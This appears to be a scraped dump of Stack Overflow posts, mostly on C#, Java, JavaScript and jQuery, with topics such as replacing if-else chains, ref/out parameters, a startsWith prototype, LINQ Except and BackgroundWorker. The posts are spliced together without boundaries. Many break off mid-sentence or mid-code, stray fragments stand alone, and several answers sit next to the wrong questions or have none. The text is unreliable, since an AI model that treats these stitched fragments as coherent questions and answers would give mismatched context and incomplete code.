(i == 3) ? doThree() : doNone();
</code></pre>

<p>or using Map (in Java and I think in C# too) or Dictionary or any other K/V structure like this:</p>

<pre><code>public interface IFunctor() {
    void call();
}

public class OneFunctor implemets IFunctor() {
    void call() {
    	ref.doOne();
    }
}

/* etc. */    

Map&lt;Integer, IFunctor&gt; methods = new HashMap&lt;Integer, IFunctor&gt;();
methods.put(1, new OneFunctor());
methods.put(2, new TwoFunctor());
methods.put(3, new ThreeFunctor());
/* .. */
(methods.get(i) != null) ? methods.get(i).call() : doNone();
</code></pre>

<p>In fact the Map method above is what I ended up doing last time but now I can't stop thinking that there has to be better alternatives in general for this exact issue.</p>

<p>So, which other -and most likely better- ways to replace the if..else if..else are out there and which one is your favorite?</p>

<h2>Your thoughts below this line!</h2>

<p><hr /></p>

<p>Okay, here are <strong>your</strong> thoughts:</p>

<p>First, most popular answer was switch statement, like so:</p>

<pre><code>switch (i) {
    case 1:  doOne(); break;
    case 2:  doTwo(); break;
    case 3:  doThree(); break;
    default: doNone(); break;
}
</code></pre>

<p>That only works for values which can be used in switches, which at least in Java is quite a limiting a factor. Acceptable for simple cases though, naturally.</p>

<p>The other and perhaps a bit fancier way you seem to sugges is to do it using polymorphism. The Youtube lecture linked by CMS is an excellent watch, go see it here: <a href=""http://www.youtube.com/watch?v=4F72VULWFvc"">""The Clean Code Talks -- Inheritance, Polymorphism, &amp; Testing""</a> As far as I understood, this would translate to something like this:</p>

<pre><code>public interface Doer {
    void do();
}

public class OneDoer implements Doer {
    public void do() {
    	doOne();
    }
}
/* etc. */

/* some method of dependency injection like Factory: */
public class DoerFactory() {
    public static Doer getDoer(int i) {
    	switch (i) {
    		case 1: return new OneDoer();
    		case 2: return new TwoDoer();
    		case 3: return new ThreeDoer();
    		default: return new NoneDoer();
    	}
    }
}

/* in actual code */

Doer operation = DoerFactory.getDoer(i);
operation.do();
</code></pre>

<p>Two interesting points from the Google talk:</p>

<ul>
<li>Use Null Objects instead of returning nulls (and please throw only Runtime Exceptions)</li>
<li>Try to write a small project without if:s.</li>
</ul>

<p>Also in addition one post worth mentioning in my opinion is CDR who provided his perverse habits with us and while not recommended to use, it's just very interesting to look at.</p>

  to the same if/switch in several

<p>But I tried that in my code and I seem to be getting effects that imply  the above is simply doing:</p>

<p>cloneList = originalList...  because changes to cloneList seem to be affecting originalList.</p>

"<p>My team recently rebuilt their SQL Server 2005 development database from scratch using the TFS source files.</p>

<p>Afterwards, we had a nice clean database that more closely matched our test and production environments. However, we also lost the database diagrams that had been created over the months in the old development database.</p>

<p>Does anyone know of a way to export a SQL Server 2005 database diagram from one database to another that contains the same tables and schema objects?</p>

<p>Both Valentin and CMS's answers below should work just fine. I accepted Valentin's because it was first and I had already started using it.</p>

<p>I ended up creating a temp table called 'robsysdiagrams' and copied all the data into that and used the <a href=""http://www.microsoft.com/downloads/details.aspx?familyid=56E5B1C5-BF17-42E0-A410-371A838E570A&amp;displaylang=en"">Microsoft SQL Server Database Publishing Wizard</a> to script the data inserts out to disk.

<p>What I am wondering is, what does the extension method achieve?</p>

<p>On first pass, x = x.Next means we are looking at Ringo rather than George, and so on. What exactly is happening under the bonnet and what is the code doing from the point when I call NodeAt(6) onwards? I ask this as it's important to be able to read and understand code without using the stepping through approach as an aid (sometimes at work you will read code in a printed document, for example). Also, why do we count backwards in the loop and why is there a bracket to subtract 1 before entering the loop body?</p>

<p>Thanks</p>
","5445","CMS","<p>The extension method only steps through the LinkedList <code>n</code> elements, it initializes <code>x</code> with the first element of the list (l.First) and then in the while, it decrements the index to step forward <code>n</code> times (look <code>x = x.Next;</code>):</p>

<pre>
Index:  1           2            3            4
     _ _ _ _     _ _ _ _     _ _ _ _ _     _ _ _ _
    | John  |-> | Paul  |-> | George  |-> | Ringo |
     ‾ ‾ ‾ ‾     ‾ ‾ ‾ ‾     ‾ ‾ ‾ ‾ ‾     ‾ ‾ ‾ ‾

<p>So if you call the method with the index 4  (<code>NodeAt(4)</code>), it will get the first item (John), decrement the counter (to 3), step to the next item (Paul), decrement again (2), get the next item (George), decrement (to 1), get the next item (Ringo) and then decrement to 0 and this will <em>exit the while</em>, and <em>return</em> the LinkedList Item, at the 4 position (Ringo).</p>

","5445","CMS","<p>In your first example, the int parameter <code>value</code> is incremented, but is destroyed when the method ends, you cannot get the value outside the method, unless you use the <a href=""http://msdn.microsoft.com/en-us/library/14akc2c7(VS.71).aspx"" rel=""nofollow"">ref</a> or <a href=""http://msdn.microsoft.com/en-us/library/t3c3bfhx.aspx"" rel=""nofollow"">out</a> keywords.</p>

<p>Ref and out parameter passing modes are used to allow a method to alter variables passed in by the method caller. The main difference between ref and out may be subtle but it's important. </p>

<p>Each parameter passing mode is designed to suite different programming needs.</p>

<p>The caller of a method which takes an <strong>out</strong> parameter is not required to assign to the variable passed as the out parameter prior to the call; however, the method <strong>is required</strong> to assign to the out parameter before returning.</p>

<p>One way to think of out parameters is that they are like additional return values of a method. They are convenient when a method should return more than one value.</p>

<p>The <strong>ref</strong> parameters causes the arguments to be passed by reference. The effect is that any changes to the parameter in the method will be reflected in that variable when control passes back to the calling method.</p>

<p><em>Do not confuse the concept of passing by reference with the concept of reference types</em>. </p>

<p>The two concepts are not related; a method parameter can be modified by ref regardless of whether it is a value type or a reference type, there is no boxing of a value type when it is passed by reference.</p>

"<p>IS there a good use for inout (ref in C#, byref (like out parameters) in vb.net) parameters in .NET?<br />
I feel that the confusion caused by a parameter used both as input and as a return value is worse that the increase in the number of parameters for out parameters, or returning an array or returning an custom class.</p>
","5445","CMS","<p>Ref and out parameter passing modes are used to allow a method to alter variables passed in by the method caller. </p>

<p>Each parameter passing mode (ref and out) is designed to suite different programming needs.</p>

<p>The caller of a method which takes an <strong>out parameter</strong> is <strong>not</strong> required to assign to the variable passed as the out parameter prior to the call; however, the method is required to assign to the out parameter before returning.</p>

<p>One way to think of <strong>out</strong> parameters is that they are like additional return values of a method. They are convenient when a method should return <strong>more than one</strong> value.</p>

<p>Do not confuse the concept of passing by reference with the concept of reference types.</p>

<p>The two concepts are not related; a method parameter can be modified by ref regardless of whether it is a value type or a reference type, there is no boxing of a value type when it is passed by reference.</p>

"<p>I'm working on a problem in C# 2.0/.NET 2.0 where I have a Sortedlist and want to search all the ""values"" (not the ""keys"") of this SortedList for a certain substring and count up how many occurrences there are.</p>

<p>This is what I'm trying to do:</p>

<pre><code>{
   Sortedlist&lt;string,string&gt; mySortedList;
   // some code that instantiates mySortedList and populates it with data
   List&lt;string&gt; myValues = mySortedList.Values;  // &lt;== does not work
   int namesFound = myValues.FindAll(ByName(someName)).Count;
}
</code></pre>

<p>Naturally, this doesn't work because mySortedList.Values returns an IList, while ""myValues"" is a List. I tried ""casting"" the IList so that it would be accepted by myValues, but it doesn't seem to work.</p>

<p>Of course, I can loop over mySortedList.Values in a ""foreach"" loop, but I don't really want to do this.</p>

<p>Anyone have any suggestions?</p>

<p>EDIT-1: Ok, well it looks like there isn't a native way to do this easily. I had assumed that I was just missing something, but apparently I'm not. So I guess I'm just going to do a ""foreach"" over the IList. </p>

<p>Thanks for the feedback everyone! I voted everyone up 1 because I thought all the feedback was good. Thanks again! :-)</p>

<p>EDIT-2: Looks like CMS has the answer I was looking for. The only caveat with this (as Qwertie pointed out) is that there is a potential performance penalty since it involves copying all the values to another List and then searching that list start-to-finish. So for short lists, this answer is effective. Longer lists? well that's up to you to decide...</p>

"<p>I was talking to a person today who mentioned he used arrays when calling parameters or for other reasons when pulling data from the database etc.</p>

<pre><code>$id = mysql_real_escape_string($_GET['id']);
$agefrom = mysql_real_escape_string($_GET['agefrom']);
$ageto = mysql_real_escape_string($_GET['ageto']);
$sex = mysql_real_escape_string($_GET['sex']);
$location = mysql_real_escape_string($_GET['location']);

mysql_query(""select from table where id = '$id' and  agefrom='$agefrom' [.....the rest of the query]"")

"<p>I am going back over a recent project sorting out accessibility issues and was making sure all form elements had labels. Putting the label text into a  tag caused a problem with some kludgy code I had written before. </p>

<p>Basically, if you have a radio button and its label:</p>

<pre><code>&lt;label for=""zone_r1""&gt;&lt;input type=""radio"" name=""zone"" id=""zone_r1"" value=""NY"" /&gt;New York&lt;/label&gt;
</code></pre>

<p>And you use jquery to hide it like so:</p>

<pre><code>$('#zone_r1').hide();
</code></pre>

<p>The actual button is hidden but not the label text. Originally I made a span for the label text and hid that like so:</p>

<pre><code>&lt;input id=""NY"" type=""radio"" name=""zone"" value=""NY"" /&gt;&lt;span id=""nyTXT""&gt;New York&lt;/span&gt;
</code></pre>

<p>and</p>

<pre><code>$('#NY').hide();
$('#nyTXT').hide();
</code></pre>

<p>Any ideas? I prefer not to use the kludge and it may not validate with the span in the label, but maybe I am being overly zealous.</p>

"<p>How would I write the equivalent of C#'s <a href=""http://msdn.microsoft.com/en-us/library/baketfxw.aspx""><code>String.StartsWith</code></a> in Javascript?</p>

<pre><code>var data = 'hello world';
var input = 'he';

//data.startsWith(input) == true
</code></pre>
","5445","CMS","<p>You can add this function to the <code>String prototype</code>:</p>

<pre><code>if (typeof String.prototype.startsWith != 'function') {
  // see below for better implementation!
  String.prototype.startsWith = function (str){
    return this.indexOf(str) == 0;
  };
}

<p>Then you can use it directly on string values:</p>

<pre><code>""Hello World!"".startsWith(""He""); // true

var data = ""Hello world"";
var input = 'He';
data.startsWith(input); // true
</code></pre>

<p><strong>Edit:</strong> Note that I'm checking if the function exists before defining it, that's because in the future, the language might have this strings extras methods defined as built-in functions, and native implementations are always faster and preferred, see the <a href=""http://wiki.ecmascript.org/doku.php?id=harmony%3astring_extras""><em>ECMAScript Harmony String Extras</em></a> proposal.</p>

<p><strong>Edit:</strong> As others noted, <code>indexOf</code> will be inefficient for large strings, its complexity is <code>O(N)</code>. For a constant-time solution (<code>O(1)</code>), you can use either, <code>substring</code> as <a href=""http://stackoverflow.com/questions/646628/javascript-startswith/646631#646631"">@cobbal</a> suggested, or <code>String.prototype.slice</code>, which behaves similarly (note that I don't recommend using the <code>substr</code>, because it's inconsistent between implementations (most notably on JScript) ):</p>

"<p>Somewhat inspired by <a href=""http://stackoverflow.com/questions/659166/write-c-in-a-graphical-scratch-like-way/659203"">this question</a> about a graphical programming environment.  I don't think that C++ or C# are really conducive to this type of environment, but perhaps there's something halfway there.</p>

<p>Lot's of IDEs that I've used will use syntax highlighting to change the foreground (or even the background) colour of text for keywords, strings, comments, etc...  </p>

<p>Are there IDEs out there that will highlight larger syntactic structures?  Here's an example of what I'm thinking of. </p>

<p><img src=""http://img256.imageshack.us/img256/9441/codestructure.png"" alt=""Example code structure"" /></p>

<p>(Please don't comment on my poor choice of colours... I'm not a graphic designer for a reason.)</p>

<p>While it's not a graphical drag-and-drop environment, the highlighting would still give an overall view of the structure of the code.  Personally, learning C# after years of C++, I still catch myself tripping over the fact that at the end of a file you usually have the end of a class and the end of a namespace, so the end of a function is two-levels in.  (In a C++ code file, the end of a function is usually at the top level of indentation).  I help myself out there by throwing in little comments at the close brackets:</p>

<pre><code>    } // end class 
} // end namespace

"<p>I have image, and on mouse over it fades in two arrows (on the left and right sides), then on mouseout it fades those arrows out. My problem is that when the user hovers over the arrows, the image considers it a mouseout (since the arrows float above the image), and fades the arrows out, causing an infinate loop of fading in/out until you move the mouse away.

<p>UPDATED:</p>

<p>This is the actual code. This is more like a workflow kind of thing. But each task is defined as property of a class (class is used to group tasks).</p>

<p>So, the code will be able to retrieve the full name of the class and property something like: <code>namespace.ApplicationTask.SendIncompleteNotification</code> and save this into the database.

                       join lu in localList
                           on u.ID equals lu.ID
                       select u;
         return matches;
    }
}

{
    static void Main(string[] args)
    {
        XDocument doc = XDocument.Load(""Users.xml"");
        IEnumerable&lt;IUser&gt; users = doc.Element(""Users"").Elements(""User"").Select
            (u =&gt; new User
                { ID = (int)u.Attribute(""id""),
                  Name = (string)u.Attribute(""name"")

        var excludes = users.Except(matches);    // excludes should contain 6 users but here it contains 8 users

    }
}
</code></pre>

<p>When I call <code>User.GetMatchingUsers(users)</code> I get 2 matches as expected.
The issue is that when I call <code>users.Except(matches)</code> The matching users are not being excluded at all! I am expecting 6 users ut ""excludes"" contains all 8 users instead.</p>

<p>Since all I'm doing in  <code>GetMatchingUsers(IEnumerable&lt;IUser&gt; users)</code> is taking the <code>IEnumerable&lt;IUser&gt;</code> and just returning
the <code>IUsers</code> whose ID's match( 2 IUsers in this case), my understanding is that by default <code>Except</code> will use reference equality
for comparing the objects to be excluded. Is this not how <code>Except</code> behaves?</p>

<p>What is even more interesting is that if I materialize the objects using <code>.ToList()</code> and then get the matching users, and call <code>Except</code>,
everything works as expected!</p>

<p>Like so:</p>

<pre><code>IEnumerable&lt;IUser&gt; users = doc.Element(""Users"").Elements(""User"").Select
            (u =&gt; new User
                { ID = (int)u.Attribute(""id""),
                  Name = (string)u.Attribute(""name"")
                }
            ).OfType&lt;IUser&gt;().ToList();   //explicity materializing all objects by calling ToList()

var matches = User.GetMatchingUsers(users);
var excludes = users.Except(matches);   // excludes now contains 6 users as expected
</code></pre>

<p>I don't see why I should need to materialize objects for calling <code>Except</code> given that its defined on <code>IEnumerable&lt;T&gt;</code>?</p>

"<p><strong>How can I detect (with regular expressions or heuristics) a web site link in a string of text such as a comment?</strong></p>

<p>The purpose is to prevent spam.  HTML is stripped so I need to detect invitations to copy-and-paste.  <em>It should not be economical for a spammer to post links because most users could not successfully get to the page</em>.  I would like suggestions, references, or discussion on best-practices.</p>

<p>Some objectives:</p>

<ul>
<li>The low-hanging fruit like well-formed URLs (<code>http://some-fqdn/some/valid/path.ext</code>)</li>
<li>URLs but without the <code>http://</code> prefix (i.e. a valid FQDN + valid HTTP path)</li>
<li>Any other funny business</li>
</ul>

<p>Of course, I am blocking spam, but the same process could be used to auto-link text.</p>

<h2>Ideas</h2>

<p>Here are some things I'm thinking.</p>

<ul>
<li>The content is native-language prose so I can be trigger-happy in detection</li>
<li>Should I strip out all whitespace first, to catch ""<code>www .example.com</code>""? Would common users know to remove the space themselves, or do any browsers ""do-what-I-mean"" and strip it for you?</li>
<li>Maybe multiple passes is a better strategy, with scans for:
<ul>
<li>Well-formed URLs</li>
<li>All non-whitespace followed by '.' followed by any valid TLD</li>
<li>Anything else?</li>
</ul></li>
</ul>

<p>I've read these and they are now documented here, so you can just references the regexes in those questions if you want.</p>

</ul>

<h2>Update and Summary</h2>

<p>Wow, I there are some very good heuristics listed in here! For me, the best bang-for-the-buck is a synthesis of the following:</p>

<ol>
<li>@Jon Bright's technique of detecting TLDs (a good defensive chokepoint)</li>
<li>For those suspicious strings, replace the dot with a dot-looking character as per @capar</li>
<li>A good dot-looking character is @Sharkey's subscripted &amp;middot; (i.e. ""<sub>&middot;</sub>"").  &amp;middot; is also a word boundary so it's harder to casually copy &amp; paste.</li>
</ol>

<p>That should make a spammer's CPM low enough for my needs; the ""flag as inappropriate"" user feedback should catch anything else. Other solutions listed are also very useful:</p>

<ul>
<li>Strip out all dotted-quads (@Sharkey's comment to his own answer)</li>
<li>@Sporkmonger's requirement for client-side Javascript which inserts a required hidden field into the form.</li>
<li>Pinging the URL server-side to establish whether it is a web site.  (Perhaps I could run the HTML through SpamAssassin or another Bayesian filter as per @Nathan..)</li>
<li>Looking at Chrome's source for its smart address bar to see what clever tricks Google uses</li>

"<p>I was wondering if anyone knows how the C# compiler handles the following assignment:</p>

<pre><code>int? myInt = null;
</code></pre>

<p>My assumption is that there is an implicit conversion performed, but I cannot figure out how the null literal assignment is handled.  I dissasembled the System.Nullable object and found the implicit operator is overriden to this:</p>

<pre><code>public static implicit operator T?(T value)  {
    return new T?(value);  
}
</code></pre>

<p>Once called this would try to fire the secondary constructor:</p>

<pre><code>public Nullable(T value) {
    this.value = value;
    this.hasValue = true; 
}
</code></pre>

<p>Which is where my confusion comes into play... this.value is of some value type and cannot be null.</p>

<p>So, does anyone know how this ""magic"" takes place... or am I wrong in assuming that the secondary constructor is called?

"<p>I have a windows form, on which I display data from a local database.</p>

<p>I'd like to also connect to a remote database, and display some other data from there.. however, this remote database could be down, or slow. </p>

<p>I don't want the UI to freeze while I try to connect to this remote database.</p>

<p>So knowing nothing about threading or thread-safety, here's my hamfisted example:</p>

<pre><code>RemoteDataContext rdt;

private void GetRemoteDataContext() {
    rdt = new RemoteDataContext(RemoteServerConnectionString);
}

private void FillFromRemoteDataContext() {
   lblTest.text = rdt.TestTable.First().TestField;
}

private void Form1_Shown(object sender, EventArgs e) {
    Thread t = new Thread(new ThreadStart(new delegate {
        try {
            GetRemoteDataContext();
            FillFromRemoteDataContext();
        } catch { }  // ignore connection errors, just don't display data
    );
    t.Start;
}
</code></pre>

<p>So you should be able to tell from that what it is that I want to acheive.</p>

<p>My question is, what is the correct way to go about it?</p>

<p><hr /></p>

<p><strong>Update:</strong> Thanks guys, now I have (in <code>Form1Shown</code>):</p>

<pre><code>BackgroundWorker bw = new BackgroundWorker();
bw.DoWork += new DoWorkEventHandler((sender, e) =&gt; {
    e.Result = null;
    try {
        e.Result = new RemoteDataContext(RemoteServerConnectionString);
    } catch { } // ignore connection errors, just don't display data
});
bw.RunWorkerCompleted += new RunWorkerCompletedEventHandler((sender, e) =&gt; {
    if (e.Result != null) {
        rdt = (RemoteDataContext)e.Result;
        FillFromRemoteDataContext();            
    }
});
bw.RunWorkerAsync();

"<p>I'm looking at the example for the ""click"" event in the jQuery documentation <a href=""http://docs.jquery.com/Events/click#fn"" rel=""nofollow"">here</a>. I can refactor the two anonymous functions as follows and it still works:</p>

<pre><code>$(document).ready(function(){
    $(""p"").hover(hilite, remove_hilite);
  });

  function hilite()
  {
    $(this).addClass(""hilite"");
  }

  function remove_hilite()
  {
    $(this).removeClass(""hilite"");
  }
</code></pre>

<p>However, what if I want to pass an argument to <code>hilite</code>? My first guess was that I should use an anonymous function like <a href=""http://docs.jquery.com/How%5FjQuery%5FWorks#Right"" rel=""nofollow"">this</a>. However, this does not seem to work, even when I'm using it without arguments:</p>

<pre><code>$(""p"").hover(
    function()
    {
        hilite();
    }
    ,
    function()
    {
        remove_hilite();
    }
);
</code></pre>

<p>I also tried refactoring as follows, but this did not work either:</p>

<pre><code>$(document).ready(function(){
    $(""p"").hover(hilite2, remove_hilite);
  });

  function hilite2(){
     return hilite();
  }
</code></pre>

<p>What is the proper way to do this? I feel like I have a big conceptual misunderstanding. In particular, I am unclear about how in my first refactoring, the <code>this</code> object is passed to the <code>hilite</code> function.</p>
","5445","","<p>You can encapsulate your hover function call into another function that accepts the 'className' parameter:</p>

<pre><code>$.fn.hoverClass = function(className){
    return this.hover(function(){
        $(this).addClass(className);
    }, function(){
        $(this).removeClass(className);
    });
}
</code></pre>

<p>Then you can use it simply by this:</p>

<pre><code>$('p').hoverClass('hilite');

"<p>I'm trying to fire a function when the ""keyup"" event happens. This works fine when I'm testing it on normal textarea's and input fields, however, when I use the same code on the tinyMCE editor, nothing happens. I suspect it is because the tinyMCE is running on java, and already has event listeners in place, however my java knowledge is an age away from being anywhere near adiquate to deal with this problem!</p>

"<p>I have a web form that contains lots of JavaScript functionalities to manipulate the DOM.
This is achieved using AJAX to call a service that will return me whatever I have to do, such as hiding elements, cascading drop downs, removing and inserting new items to a select, etc.</p>

<p>Everything works as expected apart from one particular function. This function only disables and sets a default value in a select element depending on what my AJAX call returned. For instance, let's say I had selected ""foo"" from the following select and saved the record:</p>

<pre><code>&lt;select id=""mySelect2""&gt;
  &lt;option value=""0""&gt;Default&lt;/option&gt;
  &lt;option value=""foo""&gt;Foo&lt;/option&gt;
  &lt;option value=""another_foo""&gt;Foo 2&lt;/option&gt;
&lt;/select&gt;
</code></pre>

<p>Great! Now I have changed other element in my web form that triggered off my AJAX call. The returned data tells me that I should select Default and disable the select element. This works just fine. But, when I save the record again and verify it in the DB the Default value of 0 in this case is not being saved. The record remains with the previous selected item (""foo"").</p>

<p>If you are curious, I using the following code to accomplish this:</p>

<ol>
<li><p>Binds the AJAX call</p>

<pre><code>$('myElement').change(GetData);
</code></pre></li>
<li><p>GetData method</p>

<pre><code>$.ajax({
    type: 'POST',
    url: 'myUrl',
    data: ""{'id':'"" + myIdFromMyElement + ""'""}"",
    contentType: 'application/json; charset=utf-8',
    dataType: 'json',
    success: OnSuccess,
    error: OnError
});
</code></pre></li>
<li><p>Manipulate the select element according to the returned data:</p>

<pre><code>function OnSuccess(data, textStatus) { 
    if (data.d.DisableMySelect2){
        $('#mySelect2').val('0');
        $('#mySelect2').attr('disabled', 'disabled');
    }
}
</code></pre></li>
</ol>

<p>Why is this happening?</p>

<p><strong>EDIT:</strong></p>

<pre><code>function someObj (){

","5445","CMS","<p><strong>Assigning default values to variables</strong></p>

<p>You can use the logical or operator <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Operators/Logical_Operators"" rel=""nofollow""><code>||</code></a> in an assignment expression to provide a default value:</p>

<pre><code>var a = b || c;
</code></pre>

<p>The <code>a</code> variable will get the value of <code>c</code> only if <code>b</code> is <em>falsy</em> (if is <code>null</code>, <code>false</code>, <code>undefined</code>, <code>0</code>, <code>empty string</code>, or <code>NaN</code>), otherwise <code>a</code> will get the value of <code>b</code>.</p>

<p>This is often useful in functions, when you want to give a default value to an argument in case isn't supplied:</p>

<pre><code>function example(arg1) {
  arg1 || (arg1 = 'default value');
}
</code></pre>

<p>Example IE fallback in event handlers:</p>

<pre><code>function onClick(e) {
    e || (e = window.event);
}
</code></pre>

<hr>

<p>The following language features have been with us for a long time, all JavaScript implementations support them, but they weren't part of the specification until <a href=""http://www.ecma-international.org/publications/standards/Ecma-262.htm"" rel=""nofollow"">ECMAScript 5th Edition</a>:</p>

<p><strong>The <code>debugger</code> statement</strong></p>

<p>Described in: <em>&sect; 12.15 The debugger statement</em></p>

<p>This statement allows you to put <em>breakpoints programmatically</em> in your code just by:</p>

<pre><code>// ...
debugger;
// ...
</code></pre>

<p>If a debugger is present or active, it will cause it to break immediately, right on that line.</p>

<p>Otherwise, if the debugger is not present or active this statement has no observable effect.</p>

<p><strong>Multiline String literals</strong></p>

<p>Described in: <em>&sect; 7.8.4 String Literals</em></p>

<pre><code>var str = ""This is a \
really, really \
long line!"";
</code></pre>

<p>You have to be careful because the character next to the <code>\</code> <em>must</em> be a line terminator, if you have a space after the <code>\</code> for example, the code will <em>look</em> exactly the same, but it will raise a <code>SyntaxError</code>.</p>

<p>My own pseudo-library is mainly missing a way to turn an XML-RPC response into JSON - or rather, converting the respective responseXML to a JavaScript object (converting the <a href=""http://en.wikipedia.org/wiki/XML-RPC#Data_types"" rel=""nofollow"">data types</a> as needed).
This isn't hard to do, but why reinvent the wheel...</p>

<p>Any help would be greatly appreciated!</p>

"<p>This is definitely subjective, but I'd like to try to avoid it becoming argumentative. I think it could be an interesting question if people treat it appropriately.</p>

"<p>If you had to choose your <strong>Favorite</strong> (clever) techniques for defensive coding, what would they be?  Although my current languages are Java and Objective-C (with a background in C++), feel free to answer in any language.  Emphasis here would be on <em>clever</em> defensive techniques other than those that 70%+ of us here already know about.  So now it is time to dig deep into your bag of tricks.</p>

<p>In other words try to think of other than this <strong>uninteresting</strong> example:</p>

<ul>
<li><code>if(5 == x)</code> <strong>instead of</strong> <code>if(x == 5)</code>:  to avoid unintended assignment</li>
</ul>

<p>Here are some examples of some <strong>intriguing</strong> best defensive programming practices (language-specific examples are in Java):</p>

<p><strong>- Lock down your variables until you know that you need to change them</strong></p>

<p>That is, you can declare <em>all</em> variables <code>final</code> until you know that you will need to change it, at which point you can remove the <code>final</code>. One commonly unknown fact is that this is also valid for method params:</p>

<pre><code>public void foo(final int arg) { /* Stuff Here */ }
</code></pre>

<p><strong>- When something bad happens, leave a trail of evidence behind</strong></p>

<p>There are a number of things you can do when you have an exception: obviously logging it and performing some cleanup would be a few.  But you can also leave a trail of evidence (e.g. setting variables to sentinel values like ""UNABLE TO LOAD FILE"" or 99999 would be useful in the debugger, in case you happen to blow past an exception <code>catch</code>-block).</p>

<p><strong>- When it comes to consistency: the devil is in the details</strong></p>

<p>Be as consistent with the other libraries that you are using.  For example, in Java, if you are creating a method that extracts a range of values make the lower bound <em>inclusive</em> and the upper bound <em>exclusive</em>.  This will make it consistent with methods like <code>String.substring(start, end)</code> which operates in the same way.  You'll find all of these type of methods in the Sun JDK to behave this way as it makes various operations including iteration of elements consistent with arrays, where the indices are from Zero (<em>inclusive</em>) to the length of the array (<em>exclusive</em>). </p>

<p>So what are some favorite defensive practices of yours?</p>

"<p>This is a derivative question, but I'm inquiring as to the data structures that you should at least be familiar with for their usefulness.  These structures are too hard to implement without some expertise however.</p>

"<p>I am using a control for a popup calendar date picker.  This uses a javascript function, SetText, to set the textbox to the given date.  I can't change anything in the calendar control itself but I can override the SetText function.

<p>Now, I need to make sure this shows correctly for different cultures.  For example, the UK shows dates as ""30 April"".  Since the code-behind(c#) could be sending the date in the UK format how do I know in the javascript that they're using UK(dd/mm/yyyy) and not US(mm/dd/yyyy)?<br />
The browsers navigator language could be set to one setting while the server is set to another to cause a January 4 as April 1 mismatch.</p>

"<p>I want to have my form in a wizard style and so I used TabControl to have the pages of the Wizard as my TabPages. There were small issues to be corrected, such as, making the tabs being displayed in runtime. I inherited the TabControl and I added a property called ""TabsVisible"" and corrected it. It worked fine. (See : <a href=""http://dotnetrix.co.uk/tabcontrol.htm"" rel=""nofollow"">http://dotnetrix.co.uk/tabcontrol.htm</a> - Add a HideTabs property to turn on/off the Tabitems)</p>

<p>But there are other small issues like :
1. When Ctrl + Tab is pressed the tabs get changed. This is disabled by overriding the OnKeyDown method
2. When the active cursor is in the tab list, and if Arrow keys are pressed, the current tab page gets changed. How can I disable this?? </p>

<p>So my question is - How can disable Arrow keys in tabControl so that the tab page doesn't get changed?</p>
","5445","","<p>To disable the arrow key from changing the page of your TabControl, you can handle the KeyDown event, and do something like this:</p>

<pre><code>private void tabControl_KeyDown(object sender, KeyEventArgs e)
{
    bool isArrowKey = e.KeyCode == Keys.Up || e.KeyCode == Keys.Down ||
                      e.KeyCode == Keys.Left || e.KeyCode == Keys.Right;

    e.Handled = isArrowKey;
}

Source code with some comments: <a href=""http://jsbin.com/agedu/edit"" rel=""nofollow"">http://jsbin.com/agedu/edit</a></p>

<p>The problem is that when typing something and doing the query to display search results, if I go back to the search page in my browser (Firefox 3.5 but it's the same thing with IE8) there isn't my search terms anymore.</p>

<p>It's replaced by grey text. This grey text that I only want to have when there isn't any filled text.</p>

<p>When I remove the jQuery code, if I do some search and press ""go back"" button on my browser the filled text is still present.</p>

<p>And even with this example page: <a href=""http://mucur.name/system/jquery%5Fexample/"" rel=""nofollow"">http://mucur.name/system/jquery_example/</a></p>

<p>If I write some text, load some other URL in the address bar, and then press go back button, the filled text is still present, while it's not with my code.</p>

<p>So my question is: do you have any idea how to keep this text if filled?</p>

<p>There should be a way to detect if the input is filled and avoid replacing text if so.</p>

<p>It may come from browsers and how they deal with JavaScript but I'm not sure about it.</p>
","5445","","<p>When you initialize your plugin, you were setting resetting the value of the inputs, I just refactored a bit and added the following check:</p>

          $(this).attr('value', hvalue).addClass(opts.hclass);
        }

<p>I separated that operations from your focus event connection chain.</p>

<p>Now it will only set the default value (hvalue) and the default gray class (hclass) <em>if the element value is <code>''</code> or it has the default value</em>.</p>

<p>Ok, I've changed id to class,i.e class='shareform'. Now the shareform class is hidden initially. But if I click the 'Share' link, the 'shareform' class is showed for both the forms.</p>

"<p>I have two tables:</p>

<pre><code>block: int id, [other columns...]
blockInstance: int id, int blockId (references Block.Id), [other columns...]
</code></pre>

<p>My goal is to generate an enumeration of block objects with two properties: (1) Id (the Id of the Block) and (2) InstanceCount (the number of Instances for the Block). Currently, my XML file contains no Block Instances (that table exists but has zero rows).</p>

<p>Here's my (non-working) query:</p>

<pre><code>var groupedBlocks =
    from
        b in _tableDictionary[""block""].Elements()
    join
        bi in _tableDictionary[""blockInstance""].Elements()

    group
        lj by b.Element(_ns + ""id"").Value into g
    select new
    {
        Id = g.Key,
        InstanceCount = g.Count(i =&gt; i.Element(_ns + ""blockId"") != null)
    };
</code></pre>

<p>The problem is with the predicate (lambda expression) for g.Count(). If I remove the predicate and just use g.Count(), the query generates the proper number of rows, but the InstanceCount for each row is 1, which is wrong (it should be zero). With the predicate in there, the query return zero rows, and if I attempt to view the ResultsView in the debugger, it says ""Exception: object reference not set to an instance of an object"".</p>

<p>My greatest confusion is what exactly <em>is</em> ""i"" in my lambda expression. I know it's an XElement, but what does this XElement contain when the data is the result of a join (in this case, a left outer join)?</p>

<p>Okay, well I got one more idea while I was typing this out, and it actually worked :-), but I have no idea why :-(, so I'm still going to ask the question ;-).</p>

<p>If I change the offending code to...</p>

<pre><code>InstanceCount = g.Count(i =&gt; i != null)
</code></pre>

<p>...it works. But why?! Again, what is getting passed into the lamba expression? And why is it null?</p>

<p>Thanks!</p>
","5445","","<p>The parameter passed to the Count lambda is the same type of the one you are grouping. That's because you are calling Count in the context of <code>g</code> which is an <code>IGrouping&lt;string, XElement&gt;</code>.</p>

<p>So, <code>i</code> is <code>XElement</code>.</p>

<p>In your first query you were actually checking for the first child of the grouped <code>XElement</code>, (accessing the <code>i.Element</code> method), that's why it didn't worked.</p>

"<p>I think this is a pretty basic question, but I'm struggling with this problem.</p>

<p>On my form I have an option to dynamically add a new row to the table, which is simple enough to do with jQuery. On one of the elements, I need to bind an event, also relatively straightforward. The part I'm having problems with is the event that needs to be bound has to take a parameter. So, the code I've got:</p>

<pre><code>$(newrow).find(""select"").each(function () {
		var ochange = function(handle){
				var thisselect = ""select"" + handle;
				var thislink = ""link"" + handle;
				var thiscollate = ""collate"" + handle;
				if(document.getElementById(thisselect).value == 4){
					document.getElementById(thislink).style.visibility = 'visible';
				}
				else{
					document.getElementById(thislink).style.visibility = 'hidden';
					document.getElementById(thiscollate).value = """";
				}
		};
